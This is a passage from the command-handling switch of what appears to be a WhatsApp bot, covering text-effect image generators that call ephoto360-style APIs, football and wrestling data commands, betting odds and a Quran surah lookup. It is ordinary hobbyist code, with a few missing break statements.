    const link = "https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in galaxystyle command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "galaxywallpaper": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}galaxywallpaper Kevin*`);
    }

    const link = "https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in galaxywallpaper command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "makingneon": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}makingneon Kevin*`);
    }

    const link = "https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in makingneon command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
case "matrix": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}matrix Kevin*`);
    }

    const link = "https://en.ephoto360.com/matrix-text-effect-154.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in matrix command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case"royaltext": {
let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}royaltext Kevin*`);
    }

    const link = "https://en.ephoto360.com/royal-text-effect-online-free-471.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in royaltext command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "sand": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}sand Kevin*`);
    }

    const link = "https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in sand command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "summerbeach": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}summerbeach Kevin*`);
    }

    const link = "https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in summerbeach command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "typography": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}typography Kevin*`);
    }

    const link = "https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in typography command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "luxurygold": {
let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}luxurygold Kevin*`);
    }

    const link = "https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in luxurygold command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "glossysilver": {
const text = args.join(" ");
        if (!text) return reply(`*Example: ${prefix}glossysilver Kevin*`);
        
        try {
            await reply("✨ Creating glossy silver text effect... Please wait ⏳");
            
            const axios = require('axios');
            const apiUrl = `https://api.princetechn.com/api/ephoto360/glossysilver?apikey=prince&text=${encodeURIComponent(text)}`;
            
            const response = await axios.get(apiUrl);
            
            if (response.data && response.data.success && response.data.result && response.data.result.image_url) {
                await conn.sendMessage(m.chat, {
                    image: { url: response.data.result.image_url },
                    caption: `> ${global.wm}`
                }, { quoted: m });
            } else {
                reply("Failed to generate glossy silver text. Please try again.");
            }
        } catch (error) {
            console.error("Error in glossysilver command:", error);
            reply("Error generating glossy silver text. Please try again later.");
        }
}
break
case "bear":
case "bearlogo":
case "beartext": {
  if (!text) return reply(`*Example: ${prefix}firetext Kevin*`);

    try {
        await reply(`🐻 *Creating bear logo for:* ${q}\n⏳ Please wait...`);
        
        const apiUrl = `https://api.nexray.eu.cc/textpro/bear?text=${encodeURIComponent(text)}`;
        
        const response = await axios.get(apiUrl, {
            responseType: 'arraybuffer',
            timeout: 20000
        });

        await conn.sendMessage(m.chat, {
            image: Buffer.from(response.data),
            caption: `> ${global.wm}`
        }, { quoted: m });
        
        await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

    } catch (error) {
        console.error("Error in bear command:", error);
        reply("*❌ An error occurred while generating the bear logo.*\nPlease try again later.");
    }
    
}
break
case "comic":
case "comiclogo":
case "comictext": {
    if (!text) return reply(`*🎭 COMIC LOGO MAKER*\n\n*Example:* ${prefix}comic Kevin\n*Example:* ${prefix}comiclogo Jexploit`);

    try {
        await reply(`🎭 *Creating comic logo for:* ${text}\n⏳ Please wait...`);
        
        const apiUrl = `https://api.nexray.eu.cc/textpro/comic?text=${encodeURIComponent(text)}`;
        
        const response = await axios.get(apiUrl, {
            responseType: 'arraybuffer',
            timeout: 20000
        });

        await conn.sendMessage(m.chat, {
            image: Buffer.from(response.data),
            caption: `> ${global.wm}`
        }, { quoted: m });
        
        await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

    } catch (error) {
        console.error("Error in comic command:", error);
        reply("*❌ An error occurred while generating the comic logo.*\nPlease try again later.");
    }
    break;
}

case "devilwings":
case "devil":
case "devilwingstext": {
    if (!text) return reply(`*👿 DEVIL WINGS LOGO MAKER*\n\n*Example:* ${prefix}devilwings Kevin\n*Example:* ${prefix}devil Jexploit`);

    try {
        await reply(`👿 *Creating devil wings logo for:* ${text}\n⏳ Please wait...`);
        
        const apiUrl = `https://api.nexray.eu.cc/textpro/devil-wings?text=${encodeURIComponent(text)}`;
        
        const response = await axios.get(apiUrl, {
            responseType: 'arraybuffer',
            timeout: 20000
        });

        await conn.sendMessage(m.chat, {
            image: Buffer.from(response.data),
            caption: `> ${global.wm}`
        }, { quoted: m });
        
        await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

    } catch (error) {
        console.error("Error in devilwings command:", error);
        reply("*❌ An error occurred while generating the devil wings logo.*\nPlease try again later.");
    }
    break;
}

case "wolfgalaxy":
case "wolf":
case "wolfgalaxytext": {
    if (!text) return reply(`*🐺 WOLF GALAXY LOGO MAKER*\n\n*Usage:* ${prefix}wolfgalaxy Lance|Kev\n*Example:* ${prefix}wolfgalaxy Kevin|Tech\n\n_Use | to separate first and second text_`);

    // Split text by | for two text inputs
    const texts = text.split('|');
    const text1 = texts[0]?.trim() || '';
    const text2 = texts[1]?.trim() || text1;

    if (!text1) {
        return reply(`*🐺 WOLF GALAXY LOGO MAKER*\n\n*Usage:* ${prefix}wolfgalaxy Lance|Kev\n*Example:* ${prefix}wolfgalaxy Kevin|Tech`);
    }

    try {
        await reply(`🐺 *Creating wolf galaxy logo for:* ${text1} & ${text2}\n⏳ Please wait...`);
        
        const apiUrl = `https://api.nexray.eu.cc/textpro/wolf-galaxy?text1=${encodeURIComponent(text1)}&text2=${encodeURIComponent(text2)}`;
        
        const response = await axios.get(apiUrl, {
            responseType: 'arraybuffer',
            timeout: 20000
        });

        await conn.sendMessage(m.chat, {
            image: Buffer.from(response.data),
            caption: `> ${global.wm}`
        }, { quoted: m });
        
        await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

    } catch (error) {
        console.error("Error in wolfgalaxy command:", error);
        reply("*❌ An error occurred while generating the wolf galaxy logo.*\nPlease try again later.");
    }
    
}
break
case 'firetext':
case 'fire':
case 'firetxt': {
    if (!text) return reply(`*Example: ${prefix}firetext Kevin*`);

    try {
        const apiUrl = `https://api.malvin.gleeze.com/ephoto360/fireText?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);

        if (response.data?.status && response.data?.result?.image_url) {
            await conn.sendMessage(m.chat, {
                image: { url: response.data.result.image_url },
                caption: `> ${global.wm}`
            }, { quoted: m });
        } else {
            reply(`Failed to generate fire text.`);
        }
    } catch (error) {
        console.error('Fire text error:', error.message);
        reply(`Error: ${error.message}`);
    }
    
}
break
case 'neontext':
case 'neon':
case 'neontxt': {
    const text = args.join(" ");
    if (!text) return reply(`*Example: ${prefix}neontext Kelvin*`);

    try {
        const apiUrl = `https://api.malvin.gleeze.com/ephoto360/neonText?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);

        if (response.data?.status && response.data?.result?.image_url) {
            await conn.sendMessage(m.chat, {
                image: { url: response.data.result.image_url },
                caption: `> ${global.wm}`
            }, { quoted: m });
        } else {
            reply(`Failed to generate neon text.`);
        }
    } catch (error) {
        console.error('Neon text error:', error.message);
        reply(`Error: ${error.message}`);
    }
    
}
break
case 'metaltext':
case 'metallic':
case 'metallictxt': {
    const text = args.join(" ");
    if (!text) return reply(`*Example: ${prefix}metaltext Kevin*`);

    try {
        const apiUrl = `https://api.malvin.gleeze.com/ephoto360/metallicText?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);

        if (response.data?.status && response.data?.result?.image_url) {
            await conn.sendMessage(m.chat, {
                image: { url: response.data.result.image_url },
                caption: `> ${global.wm}`
            }, { quoted: m });
        } else {
            reply(`Failed to generate metallic text.`);
        }
    } catch (error) {
        console.error('Metallic text error:', error.message);
        reply(`Error: ${error.message}`);
    }
    break;
}
case 'snowtext':
case 'snow':
case 'snowtxt': {
    const text = args.join(" ");
    if (!text) return reply(`*Example: ${prefix}snowtext Kevin*`);

    try {
        const apiUrl = `https://api.malvin.gleeze.com/ephoto360/snowText?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);

        if (response.data?.status && response.data?.result?.image_url) {
            await conn.sendMessage(m.chat, {
                image: { url: response.data.result.image_url },
                caption: `> ${global.wm}`
            }, { quoted: m });
        } else {
            reply(`Failed to generate snow text.`);
        }
    } catch (error) {
        console.error('Snow text error:', error.message);
        reply(`Error: ${error.message}`);
    }
    break;
}

case 'icetext':
case 'ice':
case 'icetxt': {
    const text = args.join(" ");
    if (!text) return reply(`*Example: ${prefix}icetext Kevin*`);

    try {
        const apiUrl = `https://api.malvin.gleeze.com/ephoto360/iceText?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);

        if (response.data?.status && response.data?.result?.image_url) {
            await conn.sendMessage(m.chat, {
                image: { url: response.data.result.image_url },
                caption: `> ${global.wm}`
            }, { quoted: m });
        } else {
            reply(`Failed to generate ice text.`);
        }
    } catch (error) {
        console.error('Ice text error:', error.message);
        reply(`Error: ${error.message}`);
    }
    
}
break
case 'purpletext':
case 'purple':
case 'purpletxt': {
    const text = args.join(" ");
    if (!text) return reply(`*Example: ${prefix}purpletext Kevin*`);

    try {
        const apiUrl = `https://api.malvin.gleeze.com/ephoto360/purpleText?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);

        if (response.data?.status && response.data?.result?.image_url) {
            await conn.sendMessage(m.chat, {
                image: { url: response.data.result.image_url },
                caption: `> ${global.wm}`
            }, { quoted: m });
        } else {
            reply(`Failed to generate purple text.`);
        }
    } catch (error) {
        console.error('Purple text error:', error.message);
        reply(`Error: ${error.message}`);
    }
    break;
}
case 'lighttext':
case 'light':
case 'lighttxt': {
    const text = args.join(" ");
    if (!text) return reply(`*Example: ${prefix}lighttext Kelvin*`);

    try {
        const apiUrl = `https://api.malvin.gleeze.com/ephoto360/lightText?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);

        if (response.data?.status && response.data?.result?.image_url) {
            await conn.sendMessage(m.chat, {
                image: { url: response.data.result.image_url },
                caption: `> ${global.wm}`
            }, { quoted: m });
        } else {
            reply(`Failed to generate light text.`);
        }
    } catch (error) {
        console.error('Light text error:', error.message);
        reply(`Error: ${error.message}`);
    }
    break;
}
case 'thundertext':
case 'thunder':
case 'thundertxt': {
    const text = args.join(" ");
    if (!text) return reply(`*Example: ${prefix}thundertext Kelvin*`);

    try {
        const apiUrl = `https://api.malvin.gleeze.com/ephoto360/thunderText?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);

        if (response.data?.status && response.data?.result?.image_url) {
            await conn.sendMessage(m.chat, {
                image: { url: response.data.result.image_url },
                caption: `> ${global.wm}`
            }, { quoted: m });
        } else {
            reply(`Failed to generate thunder text.`);
        }
    } catch (error) {
        console.error('Thunder text error:', error.message);
        reply(`Error: ${error.message}`);
    }
    break;
}
case 'leavestext':
case 'leaves':
case 'leavestxt': {
    const text = args.join(" ");
    if (!text) return reply(`*Example: ${prefix}leavestext Kevin*`);

    try {
        const apiUrl = `https://api.malvin.gleeze.com/ephoto360/leavesText?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);

        if (response.data?.status && response.data?.result?.image_url) {
            await conn.sendMessage(m.chat, {
                image: { url: response.data.result.image_url },
                caption: `> ${global.wm}`
            }, { quoted: m });
        } else {
            reply(`Failed to generate leaves text.`);
        }
    } catch (error) {
        console.error('Leaves text error:', error.message);
        reply(`Error: ${error.message}`);
    }
    
}
break
case 'hackertext':
case 'hacker':
case 'hackertxt': {
    const text = args.join(" ");
    if (!text) return reply(`*Example: ${prefix}hackertext Kevin*`);

    try {
        const apiUrl = `https://api.malvin.gleeze.com/ephoto360/hackerText?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);

        if (response.data?.status && response.data?.result?.image_url) {
            await conn.sendMessage(m.chat, {
                image: { url: response.data.result.image_url },
                caption: `> ${global.wm}`
            }, { quoted: m });
        } else {
            reply(`Failed to generate hacker text.`);
        }
    } catch (error) {
        console.error('Hacker text error:', error.message);
        reply(`Error: ${error.message}`);
    }
    break;
}
case 'deviltext':
case 'devil':
case 'deviltxt': {
    const text = args.join(" ");
    if (!text) return reply(`*Example: ${prefix}deviltext Kevin*`);

    try {
        const apiUrl = `https://api.malvin.gleeze.com/ephoto360/devilText?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);

        if (response.data?.status && response.data?.result?.image_url) {
            await conn.sendMessage(m.chat, {
                image: { url: response.data.result.image_url },
                caption: `> ${global.wm}`
            }, { quoted: m });
        } else {
            reply(`Failed to generate devil text.`);
        }
    } catch (error) {
        console.error('Devil text error:', error.message);
        reply(`Error: ${error.message}`);
    }
    break;
}
case 'vintagetext':
case 'vintage':
case 'vintagetxt': {
    const text = args.join(" ");
    if (!text) return reply(`*Example: ${prefix}vintagetext Kevin*`);

    try {
        const apiUrl = `https://api.malvin.gleeze.com/ephoto360/vintageText?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);

        if (response.data?.status && response.data?.result?.image_url) {
            await conn.sendMessage(m.chat, {
                image: { url: response.data.result.image_url },
                caption: `> ${global.wm}`
            }, { quoted: m });
        } else {
            reply(`Failed to generate vintage text.`);
        }
    } catch (error) {
        console.error('Vintage text error:', error.message);
        reply(`Error: ${error.message}`);
    }
    break;
}
case 'wingslogo':
case 'wings':
case 'wingslog': {
    const text = args.join(" ");
    if (!text) return reply(`Example: ${prefix}wingslogo Kevin`);

    try {
        const apiUrl = `https://api.malvin.gleeze.com/ephoto360/wingsLogo?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);

        if (response.data?.status && response.data?.result?.image_url) {
            await conn.sendMessage(m.chat, {
                image: { url: response.data.result.image_url },
                caption: `> ${global.wm}`
            }, { quoted: m });
        } else {
            reply(`Failed to generate wings logo.`);
        }
    } catch (error) {
        console.error('Wings logo error:', error.message);
        reply(`Error: ${error.message}`);
    }
    break;
}
case 'painttext':
case 'paint':
case 'painttxt': {
    const text = args.join(" ");
    if (!text) return reply(`*Example: ${prefix}painttext Kelvin*`);

    try {
        const apiUrl = `https://api.malvin.gleeze.com/ephoto360/paintText?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);

        if (response.data?.status && response.data?.result?.image_url) {
            await conn.sendMessage(m.chat, {
                image: { url: response.data.result.image_url },
                caption: `> ${global.wm}`
            }, { quoted: m });
        } else {
            reply(`Failed to generate paint text.`);
        }
    } catch (error) {
        console.error('Paint text error:', error.message);
        reply(`Error: ${error.message}`);
    }
    
}
case 'naruto': {
    if (!text) return reply(`*Example: ${prefix}naruto Kevin*`);

    try {
        const apiUrl = `https://api.malvin.gleeze.com/ephoto360/naruto?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);

        if (response.data?.status === true && response.data?.result?.image_url) {
            await conn.sendMessage(m.chat, {
                image: { url: response.data.result.image_url },
                caption: `> ${global.wm}`
            }, { quoted: m });
        } else {
            reply(`Failed to generate Naruto effect.`);
        }
    } catch (error) {
        console.error('Naruto error:', error.message);
        reply(`Error: ${error.message}`);
    }
    
}
break
case 'pubg':
case 'pubglogo': {
    if (!text) return reply(`*Example: ${prefix}pubglogo Kevin*`);

    try {
        const apiUrl = `https://api.malvin.gleeze.com/ephoto360/pubgLogo?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);

        if (response.data?.status === true && response.data?.result?.image_url) {
            const resultUrl = response.data.result.image_url;
            
            // Check if it's a video (MP4) or image
            if (resultUrl.endsWith('.mp4')) {
                await conn.sendMessage(m.chat, {
                    video: { url: resultUrl },
                    caption: `> ${global.wm}`
                }, { quoted: m });
            } else {
                await conn.sendMessage(m.chat, {
                    image: { url: resultUrl },
                    caption: `> ${global.wm}`
                }, { quoted: m });
            }
        } else {
            reply(`Failed to generate PUBG Logo effect.`);
        }
    } catch (error) {
        console.error('PUBG Logo error:', error.message);
        reply(`Error: ${error.message}`);
    }
    
}
break
case "underwater": {
const text = args.join(" ");
        if (!text) return reply(`*Example: ${prefix}underwater Kevin*`);
        
        try {
            await reply("Creating underwater text effect... Please wait");
            
            const axios = require('axios');
            const apiUrl = `https://api.princetechn.com/api/ephoto360/underwater?apikey=prince&text=${encodeURIComponent(text)}`;
            
            const response = await axios.get(apiUrl);
            
            if (response.data && response.data.success && response.data.result && response.data.result.image_url) {
                await conn.sendMessage(m.chat, {
                    image: { url: response.data.result.image_url },
                    caption: `> ${global.wm}`
                }, { quoted: m });
            } else {
                reply("Failed to generate underwater text. Please try again.");
            }
        } catch (error) {
            console.error("Error in underwater command:", error);
            reply("Error generating underwater text. Please try again later.");
        }
}
break
case "1917style": {
let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}1917style Kelvin*`);
    }

    const link = "https://en.ephoto360.com/1917-style-text-effect-523.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in 1917style command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "multicoloredneon": {
let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}multicoloredneon Kevin*`);
    }

    const link = "https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in multicoloredneon command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "dragonball": {
let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}dragonball Kelvin*`);
    }

    const link = "https://en.ephoto360.com/create-dragon-ball-style-text-effects-online-809.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in dragonball command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "pixelglitch": {
let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}pixelglitch Kevin*`);
    }

    const link = "https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in pixelglitch command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
case "corntext": {
const text = args.join(" ");
        if (!text) return reply(`*Example: ${prefix}corntext Kelvin*`);
        
        try {
            await reply("🌽 Creating corn kernels text effect... Please wait ⏳");
            
            const apiUrl = `https://api.siputzx.my.id/api/m/textpro?url=https://textpro.me/create-artistic-3d-text-effects-from-corn-kernels-1177.html&text=${encodeURIComponent(text)}`;
            
            await conn.sendMessage(m.chat, {
                image: { url: apiUrl },
                caption: `> ${global.wm}`
            }, { quoted: m });
        } catch (error) {
            console.error("Error in corntext command:", error);
            reply("Error generating effect. Please try again.");
        }
}
break
case 'eplstandings':
  case 'plstandings':
  case 'premierleaguestandings':
    await sports.formatStandings('PL', 'Premier League', { m, reply });
    break;
    
  case 'clstandings':
  case 'championsleague':
    await sports.formatStandings('CL', 'UEFA Champions League', { m, reply });
    break;
    
  case 'laligastandings':
  case 'laliga':
    await sports.formatStandings('PD', 'La Liga', { m, reply });
    break;
    
  case 'bundesligastandings':
  case 'bundesliga':
    await sports.formatStandings('BL1', 'Bundesliga', { m, reply });
    break;
    
  case 'serieastandings':
  case 'seriea':
    await sports.formatStandings('SA', 'Serie A', { m, reply });
    break;
    
  case 'ligue1standings':
  case 'ligue1':
    await sports.formatStandings('FL1', 'Ligue 1', { m, reply });
    break;
    
  case 'elstandings':
  case 'europaleague':
    await sports.formatStandings('EL', 'Europa League', { m, reply });
    break;
    
  case 'eflstandings':
  case 'championship':
    await sports.formatStandings('ELC', 'EFL Championship', { m, reply });
    break;
    
  case 'wcstandings':
  case 'worldcup':
    await sports.formatStandings('WC', 'World Cup', { m, reply });
    break;
    
  case 'eurosstandings':
    await sports.formatStandings('EUROS', 'Euros', { m, reply });
    break;
    
  case 'fifastandings':
    await sports.formatStandings('FIFA', 'FIFA World Cup', { m, reply });
    break;

  // ===== MATCHES COMMANDS =====
  case 'eplmatches':
  case 'plmatches':
    await sports.formatMatches('PL', 'Premier League', { m, reply });
    break;
    
  case 'clmatches':
  case 'championsleaguematches':
    await sports.formatMatches('CL', 'UEFA Champions League', { m, reply });
    break;
    
  case 'laligamatches':
  case 'pdmatches':
    await sports.formatMatches('PD', 'La Liga', { m, reply });
    break;
    
  case 'bundesligamatches':
  case 'bl1matches':
    await sports.formatMatches('BL1', 'Bundesliga', { m, reply });
    break;
    
  case 'serieamatches':
  case 'samatches':
    await sports.formatMatches('SA', 'Serie A', { m, reply });
    break;
    
  case 'ligue1matches':
  case 'fl1matches':
    await sports.formatMatches('FL1', 'Ligue 1', { m, reply });
    break;
    
  case 'elmatches':
  case 'europaleaguematches':
    await sports.formatMatches('EL', 'Europa League', { m, reply });
    break;
    
  case 'eflmatches':
  case 'elcmatches':
    await sports.formatMatches('ELC', 'EFL Championship', { m, reply });
    break;
    
  case 'wcmatches':
  case 'worldcupmatches':
    await sports.formatMatches('WC', 'World Cup', { m, reply });
    break;
    
  case 'euromatches':
    await sports.formatMatches('EUROS', 'Euros', { m, reply });
    break;
    
  case 'fifamatches':
    await sports.formatMatches('FIFA', 'FIFA World Cup', { m, reply });
    break;

  // ===== TOP SCORERS COMMANDS =====
  case 'eplscorers':
  case 'plscorers':
    await sports.formatTopScorers('PL', 'Premier League', { m, reply });
    break;
    
  case 'clscorers':
  case 'championsleaguescorers':
    await sports.formatTopScorers('CL', 'UEFA Champions League', { m, reply });
    break;
    
  case 'laligascorers':
  case 'pdscorers':
    await sports.formatTopScorers('PD', 'La Liga', { m, reply });
    break;
    
  case 'bundesligascorers':
  case 'bl1scorers':
    await sports.formatTopScorers('BL1', 'Bundesliga', { m, reply });
    break;
    
  case 'serieascorers':
  case 'sascorers':
    await sports.formatTopScorers('SA', 'Serie A', { m, reply });
    break;
    
  case 'ligue1scorers':
  case 'fl1scorers':
    await sports.formatTopScorers('FL1', 'Ligue 1', { m, reply });
    break;
    
  case 'elscorers':
  case 'europaleaguescorers':
    await sports.formatTopScorers('EL', 'Europa League', { m, reply });
    break;
    
  case 'eflscorers':
  case 'elcscorers':
    await sports.formatTopScorers('ELC', 'EFL Championship', { m, reply });
    break;
    
  case 'wcscorers':
  case 'worldcupscorers':
    await sports.formatTopScorers('WC', 'World Cup', { m, reply });
    break;
    
  case 'euroscorers':
    await sports.formatTopScorers('EUROS', 'Euros', { m, reply });
    break;
    
  case 'fifascorers':
    await sports.formatTopScorers('FIFA', 'FIFA World Cup', { m, reply });
    break;

  // ===== UPCOMING MATCHES COMMANDS =====
  case 'eplupcoming':
  case 'plupcoming':
    await sports.formatUpcomingMatches('PL', 'Premier League', { m, reply });
    break;
    
  case 'clupcoming':
  case 'championsleagueupcoming':
    await sports.formatUpcomingMatches('CL', 'UEFA Champions League', { m, reply });
    break;
    
  case 'laligaupcoming':
  case 'pdupcoming':
    await sports.formatUpcomingMatches('PD', 'La Liga', { m, reply });
    break;
    
  case 'bundesligaupcoming':
  case 'bl1upcoming':
    await sports.formatUpcomingMatches('BL1', 'Bundesliga', { m, reply });
    break;
    
  case 'serieaupcoming':
  case 'saupcoming':
    await sports.formatUpcomingMatches('SA', 'Serie A', { m, reply });
    break;
    
  case 'ligue1upcoming':
  case 'fl1upcoming':
    await sports.formatUpcomingMatches('FL1', 'Ligue 1', { m, reply });
    break;
    
  case 'elupcoming':
  case 'europaleagueupcoming':
    await sports.formatUpcomingMatches('EL', 'Europa League', { m, reply });
    break;
    
  case 'eflupcoming':
  case 'elcupcoming':
    await sports.formatUpcomingMatches('ELC', 'EFL Championship', { m, reply });
    break;
    
  case 'wcupcoming':
  case 'worldcupupcoming':
    await sports.formatUpcomingMatches('WC', 'World Cup', { m, reply });
    break;
    
  case 'eurosupcoming':
    await sports.formatUpcomingMatches('EUROS', 'Euros', { m, reply });
    break;
    
  case 'fifaupcoming':
    await sports.formatUpcomingMatches('FIFA', 'FIFA World Cup', { m, reply });
    break;

  // ===== SEARCH COMMANDS =====
  case 'teamsearch':
  case 'teaminfo':
  case 'clubinfo':
    const teamQuery = args.join(' ');
    await sports.searchTeam(teamQuery, { reply });
    break;
    
  case 'playersearch':
case 'player':
    const query = args.join(' ');
    await sports.searchPlayer(query, { reply, conn, m }); 
    break;

case 'venuesearch':
case 'venue':
    const venueQuery = args.join(' ');
    await sports.searchVenue(venueQuery, { reply, conn, m }); 
    break;
  case 'livescores':
  case 'livescore':
  case 'live':
    await sports.getLiveScores({ reply });
    break;

  // ===== FOOTBALL NEWS =====
  case 'footballnews':
  case 'soccernews':
  case 'fnews':
    await sports.getFootballNews({ reply });
    break;

  // ===== WRESTLING COMMANDS =====
  case 'wweevents':
  case 'wrestlingevents':
    await sports.getWrestlingEvents({ reply });
    break;
    
  case 'wwenews':
  case 'wrestlingnews':
    await sports.getWWENews({ reply });
    break;
    
  case 'wweschedule':
  case 'wrestlingschedule':
    await sports.getWWESchedule({ reply });
    break;
    
case "betting":
case "betodds": {
try {
            const apiUrl = 'https://api.malvin.gleeze.com/sports/betting/odds';
            const response = await axios.get(apiUrl);
            
            if (!response.data?.status || !response.data?.result?.tips) {
                return reply('Failed to fetch betting odds.');
            }
            
            const tips = response.data.result.tips;
            let message = `*BETTING ODDS*\n\n`;
            
            tips.forEach((match, index) => {
                message += `${index + 1}. ${match.event}\n`;
                message += `📅 ${new Date(match.commenceTime).toLocaleString()}\n`;
                message += `📊 Bookmakers: ${match.bookmakers}\n`;
                message += `\n🎲 Odds:\n`;
                
                match.bestOdds.forEach(odd => {
                    message += `   • ${odd.name}: ${odd.price}\n`;
                });
                message += `\n─────────────────\n\n`;
            });
            
            reply(message);
        } catch (error) {
            console.error('Betting odds error:', error);
            reply('Error fetching betting odds.');
        }
}
break
case "quran": {
try {
            const surahNumber = parseInt(text.trim());
            
            if (!text || isNaN(surahNumber)) {
                await conn.sendMessage(m.chat, { text: "Usage: .quran <surah_number>\nExample: .quran 1" });
                return;
            }

            const url = `https://apis.davidcyril.name.ng/quran?surah=${surahNumber}`;
            const res = await fetch(url);
            const data = await res.json();

            if (!data.success) {
                await conn.sendMessage(m.chat, { text: "Could not fetch Surah. Please try another number." });
                return;
            }

            const { number, name, type, ayahCount, tafsir, recitation } = data.surah;

            let replyText = `📖 *${name.english}* (${name.arabic})\n`;
            replyText += `Number: ${number} | Type: ${type} | Ayahs: ${ayahCount}\n\n`;
            replyText += `Tafsir: ${tafsir.id}`;

            await conn.sendMessage(m.chat, { text: replyText });

            await conn.sendMessage(m.chat, {
                audio: { url: recitation },
                mimetype: "audio/mpeg",
                mp3: true
            }, { quoted: m });

        } catch (err) {
